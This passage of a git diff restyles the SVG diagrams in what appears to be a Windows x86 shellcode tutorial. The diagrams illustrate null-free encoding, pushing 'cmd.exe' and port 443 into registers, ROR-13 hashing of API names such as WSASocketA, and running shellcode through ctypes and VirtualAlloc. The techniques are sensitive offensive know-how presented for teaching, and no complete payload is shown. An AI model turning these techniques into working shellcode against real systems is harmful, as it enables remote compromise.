+    <linearGradient id="line_s104" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
+  </defs>
+  <rect width="750" height="310" rx="10" fill="url(#bg_s104)"/>
+  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s104)"/>
   <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" font-weight="bold">SHL Chain: Building Port 443 (0xBB01) Byte-by-Byte</text>
   <!-- Step 1 -->
   <text x="40" y="62" fill="#00ff88" font-size="12" font-weight="bold">Step 1: xor eax, eax</text>
-  <rect x="280" y="48" width="60" height="28" rx="4" fill="#151b28" stroke="#8b949e" stroke-width="1.5"/>
+  <rect x="280" y="48" width="60" height="28" rx="6" fill="#151b28" stroke="#8b949e" stroke-width="1.5"/>
   <text x="310" y="67" text-anchor="middle" fill="#8b949e" font-size="12">00</text>
-  <rect x="345" y="48" width="60" height="28" rx="4" fill="#151b28" stroke="#8b949e" stroke-width="1.5"/>
+  <rect x="345" y="48" width="60" height="28" rx="6" fill="#151b28" stroke="#8b949e" stroke-width="1.5"/>
   <text x="375" y="67" text-anchor="middle" fill="#8b949e" font-size="12">00</text>
-  <rect x="410" y="48" width="60" height="28" rx="4" fill="#151b28" stroke="#8b949e" stroke-width="1.5"/>
+  <rect x="410" y="48" width="60" height="28" rx="6" fill="#151b28" stroke="#8b949e" stroke-width="1.5"/>
   <text x="440" y="67" text-anchor="middle" fill="#8b949e" font-size="12">00</text>
-  <rect x="475" y="48" width="60" height="28" rx="4" fill="#151b28" stroke="#8b949e" stroke-width="1.5"/>
+  <rect x="475" y="48" width="60" height="28" rx="6" fill="#151b28" stroke="#8b949e" stroke-width="1.5"/>
   <text x="505" y="67" text-anchor="middle" fill="#8b949e" font-size="12">00</text>
   <text x="580" y="67" fill="#8b949e" font-size="10">= 0x00000000</text>
   <!-- Step 2 -->
   <text x="40" y="112" fill="#00ff88" font-size="12" font-weight="bold">Step 2: mov al, 0xBB</text>
-  <rect x="280" y="98" width="60" height="28" rx="4" fill="#151b28" stroke="#8b949e" stroke-width="1.5"/>
+  <rect x="280" y="98" width="60" height="28" rx="6" fill="#151b28" stroke="#8b949e" stroke-width="1.5"/>
   <text x="310" y="117" text-anchor="middle" fill="#8b949e" font-size="12">00</text>
-  <rect x="345" y="98" width="60" height="28" rx="4" fill="#151b28" stroke="#8b949e" stroke-width="1.5"/>
+  <rect x="345" y="98" width="60" height="28" rx="6" fill="#151b28" stroke="#8b949e" stroke-width="1.5"/>
   <text x="375" y="117" text-anchor="middle" fill="#8b949e" font-size="12">00</text>
-  <rect x="410" y="98" width="60" height="28" rx="4" fill="#151b28" stroke="#8b949e" stroke-width="1.5"/>
+  <rect x="410" y="98" width="60" height="28" rx="6" fill="#151b28" stroke="#8b949e" stroke-width="1.5"/>
   <text x="440" y="117" text-anchor="middle" fill="#8b949e" font-size="12">00</text>
-  <rect x="475" y="98" width="60" height="28" rx="4" fill="#ff6b35" stroke-width="2"/>
-  <text x="505" y="117" text-anchor="middle" fill="#0a0e17" font-size="12" font-weight="bold">BB</text>
+  <rect x="475" y="98" width="60" height="28" rx="6" fill="#ff6b35" stroke-width="2"/>
+  <text x="505" y="117" text-anchor="middle" fill="#0d1117" font-size="12" font-weight="bold">BB</text>
   <text x="580" y="117" fill="#ff6b35" font-size="10">AL = 0xBB</text>
   <!-- Shift arrow -->
   <text x="160" y="160" fill="#00d4ff" font-size="11" font-weight="bold">SHL 8: byte slides left one position</text>
@@ -888,25 +929,25 @@ inc   eax                   ; EAX = 0x0000BB01 (port 443 in NBO)
   <polygon points="443,144 437,152 447,150" fill="#00d4ff"/>
   <!-- Step 3 -->
   <text x="40" y="192" fill="#00ff88" font-size="12" font-weight="bold">Step 3: shl eax, 0x08</text>
-  <rect x="280" y="178" width="60" height="28" rx="4" fill="#151b28" stroke="#8b949e" stroke-width="1.5"/>
+  <rect x="280" y="178" width="60" height="28" rx="6" fill="#151b28" stroke="#8b949e" stroke-width="1.5"/>
   <text x="310" y="197" text-anchor="middle" fill="#8b949e" font-size="12">00</text>
-  <rect x="345" y="178" width="60" height="28" rx="4" fill="#151b28" stroke="#8b949e" stroke-width="1.5"/>
+  <rect x="345" y="178" width="60" height="28" rx="6" fill="#151b28" stroke="#8b949e" stroke-width="1.5"/>
   <text x="375" y="197" text-anchor="middle" fill="#8b949e" font-size="12">00</text>
-  <rect x="410" y="178" width="60" height="28" rx="4" fill="#ff6b35" stroke-width="2"/>
-  <text x="440" y="197" text-anchor="middle" fill="#0a0e17" font-size="12" font-weight="bold">BB</text>
-  <rect x="475" y="178" width="60" height="28" rx="4" fill="#151b28" stroke="#8b949e" stroke-width="1.5"/>
+  <rect x="410" y="178" width="60" height="28" rx="6" fill="#ff6b35" stroke-width="2"/>
+  <text x="440" y="197" text-anchor="middle" fill="#0d1117" font-size="12" font-weight="bold">BB</text>
+  <rect x="475" y="178" width="60" height="28" rx="6" fill="#151b28" stroke="#8b949e" stroke-width="1.5"/>
   <text x="505" y="197" text-anchor="middle" fill="#8b949e" font-size="12">00</text>
   <text x="580" y="197" fill="#ff6b35" font-size="10">= 0x0000BB00</text>
   <!-- Step 4 -->
   <text x="40" y="242" fill="#00ff88" font-size="12" font-weight="bold">Step 4: inc eax</text>
-  <rect x="280" y="228" width="60" height="28" rx="4" fill="#151b28" stroke="#8b949e" stroke-width="1.5"/>
+  <rect x="280" y="228" width="60" height="28" rx="6" fill="#151b28" stroke="#8b949e" stroke-width="1.5"/>
   <text x="310" y="247" text-anchor="middle" fill="#8b949e" font-size="12">00</text>
-  <rect x="345" y="228" width="60" height="28" rx="4" fill="#151b28" stroke="#8b949e" stroke-width="1.5"/>
+  <rect x="345" y="228" width="60" height="28" rx="6" fill="#151b28" stroke="#8b949e" stroke-width="1.5"/>
   <text x="375" y="247" text-anchor="middle" fill="#8b949e" font-size="12">00</text>
-  <rect x="410" y="228" width="60" height="28" rx="4" fill="#ff6b35" stroke-width="2"/>
-  <text x="440" y="247" text-anchor="middle" fill="#0a0e17" font-size="12" font-weight="bold">BB</text>
-  <rect x="475" y="228" width="60" height="28" rx="4" fill="#00ff88" stroke-width="2"/>
-  <text x="505" y="247" text-anchor="middle" fill="#0a0e17" font-size="12" font-weight="bold">01</text>
+  <rect x="410" y="228" width="60" height="28" rx="6" fill="#ff6b35" stroke-width="2"/>
+  <text x="440" y="247" text-anchor="middle" fill="#0d1117" font-size="12" font-weight="bold">BB</text>
+  <rect x="475" y="228" width="60" height="28" rx="6" fill="#00ff88" stroke-width="2"/>
+  <text x="505" y="247" text-anchor="middle" fill="#0d1117" font-size="12" font-weight="bold">01</text>
   <text x="580" y="247" fill="#00ff88" font-size="10" font-weight="bold">= 0x0000BB01</text>
   <!-- Result -->
   <rect x="180" y="270" width="390" height="28" rx="5" fill="#151b28" stroke="#00ff88" stroke-width="1.5"/>
@@ -922,7 +963,13 @@ xor   eax, 0x50505050       ; Key
 ```
 
 <div align="center"><svg viewBox="0 0 750 400" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
-  <rect width="750" height="400" rx="10" fill="#0a0e17"/>
+  <defs>
+    <linearGradient id="bg_s105" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
+    <filter id="glow_s105"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
+    <linearGradient id="line_s105" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
+  </defs>
+  <rect width="750" height="400" rx="10" fill="url(#bg_s105)"/>
+  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s105)"/>
   <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" font-weight="bold">Null-Free Encoding Cheat Sheet</text>
   <!-- Row 1 -->
   <rect x="20" y="48" width="225" height="48" rx="5" fill="#151b28" stroke="#00ff88" stroke-width="1.5"/>
@@ -984,9 +1031,14 @@ DWORD 2: "exe\0" = 0x00657865  (contains null!)
 
 <div align="center"><svg viewBox="0 0 750 320" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
   <defs>
+    <linearGradient id="bg_s206" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient><filter id="glow_s206"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter><linearGradient id="line_s206" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
     <marker id="str-arr" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto"><polygon points="0,0 8,3 0,6" fill="#00ff88"/></marker>
+    <linearGradient id="bg_s206" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
+    <filter id="glow_s206"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
+    <linearGradient id="line_s206" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
   </defs>
-  <rect width="750" height="320" rx="10" fill="#0a0e17"/>
+  <rect width="750" height="320" rx="10" fill="url(#bg_s206)"/>
+  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s206)"/>
   <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" font-weight="bold">Building "cmd.exe" on the Stack</text>
   <!-- Step 1 -->
   <text x="40" y="58" fill="#00ff88" font-size="12" font-weight="bold">Step 1:</text>
@@ -1068,29 +1120,35 @@ push  eax
 This builds `"dll\0"` byte by byte. We will see this pattern repeatedly when building DLL name strings.
 
 <div align="center"><svg viewBox="0 0 750 340" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
-  <rect width="750" height="340" rx="10" fill="#0a0e17"/>
+  <defs>
+    <linearGradient id="bg_s106" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
+    <filter id="glow_s106"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
+    <linearGradient id="line_s106" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
+  </defs>
+  <rect width="750" height="340" rx="10" fill="url(#bg_s106)"/>
+  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s106)"/>
   <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" font-weight="bold">SHL/MOV AL Trick: Building "dll\0" in EAX</text>
   <!-- Step 1 -->
   <text x="40" y="62" fill="#00ff88" font-size="12" font-weight="bold">Step 1: xor eax, eax</text>
-  <rect x="300" y="48" width="48" height="28" rx="4" fill="#151b28" stroke="#8b949e" stroke-width="1.5"/>
+  <rect x="300" y="48" width="48" height="28" rx="6" fill="#151b28" stroke="#8b949e" stroke-width="1.5"/>
   <text x="324" y="67" text-anchor="middle" fill="#8b949e" font-size="12">00</text>
-  <rect x="353" y="48" width="48" height="28" rx="4" fill="#151b28" stroke="#8b949e" stroke-width="1.5"/>
+  <rect x="353" y="48" width="48" height="28" rx="6" fill="#151b28" stroke="#8b949e" stroke-width="1.5"/>
   <text x="377" y="67" text-anchor="middle" fill="#8b949e" font-size="12">00</text>
-  <rect x="406" y="48" width="48" height="28" rx="4" fill="#151b28" stroke="#8b949e" stroke-width="1.5"/>
+  <rect x="406" y="48" width="48" height="28" rx="6" fill="#151b28" stroke="#8b949e" stroke-width="1.5"/>
   <text x="430" y="67" text-anchor="middle" fill="#8b949e" font-size="12">00</text>
-  <rect x="459" y="48" width="48" height="28" rx="4" fill="#151b28" stroke="#8b949e" stroke-width="1.5"/>
+  <rect x="459" y="48" width="48" height="28" rx="6" fill="#151b28" stroke="#8b949e" stroke-width="1.5"/>
   <text x="483" y="67" text-anchor="middle" fill="#8b949e" font-size="12">00</text>
   <text x="540" y="67" fill="#8b949e" font-size="10">EAX = 0</text>
   <!-- Step 2 -->
   <text x="40" y="112" fill="#00ff88" font-size="12" font-weight="bold">Step 2: mov ax, 0x6c6c</text>
-  <rect x="300" y="98" width="48" height="28" rx="4" fill="#151b28" stroke="#8b949e" stroke-width="1.5"/>
+  <rect x="300" y="98" width="48" height="28" rx="6" fill="#151b28" stroke="#8b949e" stroke-width="1.5"/>
   <text x="324" y="117" text-anchor="middle" fill="#8b949e" font-size="12">00</text>
-  <rect x="353" y="98" width="48" height="28" rx="4" fill="#151b28" stroke="#8b949e" stroke-width="1.5"/>
+  <rect x="353" y="98" width="48" height="28" rx="6" fill="#151b28" stroke="#8b949e" stroke-width="1.5"/>
   <text x="377" y="117" text-anchor="middle" fill="#8b949e" font-size="12">00</text>
-  <rect x="406" y="98" width="48" height="28" rx="4" fill="#00d4ff" stroke-width="2"/>
-  <text x="430" y="117" text-anchor="middle" fill="#0a0e17" font-size="12" font-weight="bold">6c</text>
-  <rect x="459" y="98" width="48" height="28" rx="4" fill="#00d4ff" stroke-width="2"/>
-  <text x="483" y="117" text-anchor="middle" fill="#0a0e17" font-size="12" font-weight="bold">6c</text>
+  <rect x="406" y="98" width="48" height="28" rx="6" fill="#00d4ff" stroke-width="2"/>
+  <text x="430" y="117" text-anchor="middle" fill="#0d1117" font-size="12" font-weight="bold">6c</text>
+  <rect x="459" y="98" width="48" height="28" rx="6" fill="#00d4ff" stroke-width="2"/>
+  <text x="483" y="117" text-anchor="middle" fill="#0d1117" font-size="12" font-weight="bold">6c</text>
   <text x="540" y="112" fill="#00d4ff" font-size="10">AX = "ll"</text>
   <!-- Shift arrow -->
   <text x="180" y="160" fill="#ff6b35" font-size="11" font-weight="bold">SHL 8: all bytes slide left, low byte zeroed</text>
@@ -1098,25 +1156,25 @@ This builds `"dll\0"` byte by byte. We will see this pattern repeatedly when bui
   <polygon points="380,144 374,152 384,150" fill="#ff6b35"/>
   <!-- Step 3 -->
   <text x="40" y="192" fill="#00ff88" font-size="12" font-weight="bold">Step 3: shl eax, 0x08</text>
-  <rect x="300" y="178" width="48" height="28" rx="4" fill="#151b28" stroke="#8b949e" stroke-width="1.5"/>
+  <rect x="300" y="178" width="48" height="28" rx="6" fill="#151b28" stroke="#8b949e" stroke-width="1.5"/>
   <text x="324" y="197" text-anchor="middle" fill="#8b949e" font-size="12">00</text>
-  <rect x="353" y="178" width="48" height="28" rx="4" fill="#00d4ff" stroke-width="2"/>
-  <text x="377" y="197" text-anchor="middle" fill="#0a0e17" font-size="12" font-weight="bold">6c</text>
-  <rect x="406" y="178" width="48" height="28" rx="4" fill="#00d4ff" stroke-width="2"/>
-  <text x="430" y="197" text-anchor="middle" fill="#0a0e17" font-size="12" font-weight="bold">6c</text>
-  <rect x="459" y="178" width="48" height="28" rx="4" fill="#151b28" stroke="#ff3366" stroke-width="1.5"/>
+  <rect x="353" y="178" width="48" height="28" rx="6" fill="#00d4ff" stroke-width="2"/>
+  <text x="377" y="197" text-anchor="middle" fill="#0d1117" font-size="12" font-weight="bold">6c</text>
+  <rect x="406" y="178" width="48" height="28" rx="6" fill="#00d4ff" stroke-width="2"/>
+  <text x="430" y="197" text-anchor="middle" fill="#0d1117" font-size="12" font-weight="bold">6c</text>
+  <rect x="459" y="178" width="48" height="28" rx="6" fill="#151b28" stroke="#ff3366" stroke-width="1.5"/>
   <text x="483" y="197" text-anchor="middle" fill="#ff3366" font-size="12">00</text>
   <text x="540" y="192" fill="#ff6b35" font-size="10">= "ll\0" gap</text>
   <!-- Step 4 -->
   <text x="40" y="242" fill="#00ff88" font-size="12" font-weight="bold">Step 4: mov al, 0x64</text>
-  <rect x="300" y="228" width="48" height="28" rx="4" fill="#151b28" stroke="#00ff88" stroke-width="1.5"/>
+  <rect x="300" y="228" width="48" height="28" rx="6" fill="#151b28" stroke="#00ff88" stroke-width="1.5"/>
   <text x="324" y="247" text-anchor="middle" fill="#00ff88" font-size="11">\0</text>
-  <rect x="353" y="228" width="48" height="28" rx="4" fill="#00d4ff" stroke-width="2"/>
-  <text x="377" y="247" text-anchor="middle" fill="#0a0e17" font-size="12" font-weight="bold">6c</text>
-  <rect x="406" y="228" width="48" height="28" rx="4" fill="#00d4ff" stroke-width="2"/>
-  <text x="430" y="247" text-anchor="middle" fill="#0a0e17" font-size="12" font-weight="bold">6c</text>
-  <rect x="459" y="228" width="48" height="28" rx="4" fill="#00ff88" stroke-width="2"/>
-  <text x="483" y="247" text-anchor="middle" fill="#0a0e17" font-size="12" font-weight="bold">64</text>
+  <rect x="353" y="228" width="48" height="28" rx="6" fill="#00d4ff" stroke-width="2"/>
+  <text x="377" y="247" text-anchor="middle" fill="#0d1117" font-size="12" font-weight="bold">6c</text>
+  <rect x="406" y="228" width="48" height="28" rx="6" fill="#00d4ff" stroke-width="2"/>
+  <text x="430" y="247" text-anchor="middle" fill="#0d1117" font-size="12" font-weight="bold">6c</text>
+  <rect x="459" y="228" width="48" height="28" rx="6" fill="#00ff88" stroke-width="2"/>
+  <text x="483" y="247" text-anchor="middle" fill="#0d1117" font-size="12" font-weight="bold">64</text>
   <text x="540" y="237" fill="#00ff88" font-size="10" font-weight="bold">= "dll\0"</text>
   <text x="540" y="252" fill="#8b949e" font-size="9">0x006c6c64</text>
   <!-- Character labels underneath -->
@@ -1173,7 +1231,13 @@ $ python hash.py LoadLibraryA CreateProcessA ExitProcess WSAStartup WSASocketA c
 These are the exact values we embed as immediates in our shellcode.
 
 <div align="center"><svg viewBox="0 0 750 310" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
-  <rect width="750" height="310" rx="10" fill="#0a0e17"/>
+  <defs>
+    <linearGradient id="bg_s107" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
+    <filter id="glow_s107"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
+    <linearGradient id="line_s107" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
+  </defs>
+  <rect width="750" height="310" rx="10" fill="url(#bg_s107)"/>
+  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s107)"/>
   <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" font-weight="bold">ROR-13 Hash: Processing "L" (first char of LoadLibraryA)</text>
   <!-- Initial state -->
   <text x="40" y="58" fill="#ff6b35" font-size="12" font-weight="bold">Initial EDX:</text>
@@ -1201,7 +1265,13 @@ These are the exact values we embed as immediates in our shellcode.
 > **Important:** The hash algorithm in your shellcode and in your Python script must be identical. If you split the rotation for bad character avoidance (e.g., `ror edx, 7` + `ror edx, 6` instead of `ror edx, 13`), the total rotation is still 13, so the hashes remain the same.
 
 <div align="center"><svg viewBox="0 0 750 280" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
-  <rect width="750" height="280" rx="10" fill="#0a0e17"/>
+  <defs>
+    <linearGradient id="bg_s108" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
+    <filter id="glow_s108"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
+    <linearGradient id="line_s108" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
+  </defs>
+  <rect width="750" height="280" rx="10" fill="url(#bg_s108)"/>
+  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s108)"/>
   <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" font-weight="bold">ROR-13 Hash Pipeline: From API Name to Shellcode</text>
   <!-- Step 1: Function name -->
   <rect x="30" y="55" width="180" height="55" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="2"/>
@@ -1244,10 +1314,15 @@ Before we write real payloads, we need a fast development loop. Three tools make
 
 <div align="center"><svg viewBox="0 0 750 300" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
   <defs>
+    <linearGradient id="bg_s207" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient><filter id="glow_s207"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter><linearGradient id="line_s207" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
     <marker id="dev-a" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker>
     <marker id="dev-r" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#ff3366"/></marker>
+    <linearGradient id="bg_s207" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
+    <filter id="glow_s207"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
+    <linearGradient id="line_s207" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
   </defs>
-  <rect width="750" height="300" rx="10" fill="#0a0e17"/>
+  <rect width="750" height="300" rx="10" fill="url(#bg_s207)"/>
+  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s207)"/>
   <text x="375" y="30" text-anchor="middle" fill="#e0e7ff" font-size="15" font-weight="bold">Shellcode Development Pipeline</text>
   <!-- Step 1: Write -->
   <rect x="30" y="60" width="120" height="60" rx="8" fill="#151b28" stroke="#00d4ff" stroke-width="2"/>
@@ -1349,9 +1424,14 @@ shellcode_func()
 
 <div align="center"><svg viewBox="0 0 750 220" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
   <defs>
+    <linearGradient id="bg_s208" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient><filter id="glow_s208"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter><linearGradient id="line_s208" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
     <marker id="ct-a" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker>
+    <linearGradient id="bg_s208" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
+    <filter id="glow_s208"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
+    <linearGradient id="line_s208" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
   </defs>
-  <rect width="750" height="220" rx="10" fill="#0a0e17"/>
+  <rect width="750" height="220" rx="10" fill="url(#bg_s208)"/>
+  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s208)"/>
   <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" font-weight="bold">ctypes Execution Flow</text>
   <rect x="30" y="55" width="160" height="55" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="2"/>
   <text x="110" y="78" text-anchor="middle" fill="#00d4ff" font-size="11" font-weight="bold">VirtualAlloc</text>
@@ -1395,9 +1475,14 @@ We resolve three functions from kernel32.dll, stashing each at a known EBP offse
 
 <div align="center"><svg viewBox="0 0 750 260" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
   <defs>
+    <linearGradient id="bg_s209" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient><filter id="glow_s209"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter><linearGradient id="line_s209" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
     <marker id="we-a" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker>
+    <linearGradient id="bg_s209" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
+    <filter id="glow_s209"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
+    <linearGradient id="line_s209" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
   </defs>
-  <rect width="750" height="260" rx="10" fill="#0a0e17"/>
+  <rect width="750" height="260" rx="10" fill="url(#bg_s209)"/>
+  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s209)"/>
   <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" font-weight="bold">WinExec: API Resolution Map</text>
   <!-- EBP variable table -->
   <rect x="30" y="50" width="280" height="180" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="2"/>
@@ -1449,9 +1534,14 @@ We construct the string `"cmd.exe\0"` on the stack using two pushes, then call W
 
 <div align="center"><svg viewBox="0 0 750 280" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
   <defs>
+    <linearGradient id="bg_s210" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient><filter id="glow_s210"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter><linearGradient id="line_s210" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
     <marker id="we-b" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto"><polygon points="0 0, 10 3.5, 0 7" fill="#00ff88"/></marker>
+    <linearGradient id="bg_s210" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
+    <filter id="glow_s210"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
+    <linearGradient id="line_s210" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
   </defs>
-  <rect width="750" height="280" rx="10" fill="#0a0e17"/>
+  <rect width="750" height="280" rx="10" fill="url(#bg_s210)"/>
+  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s210)"/>
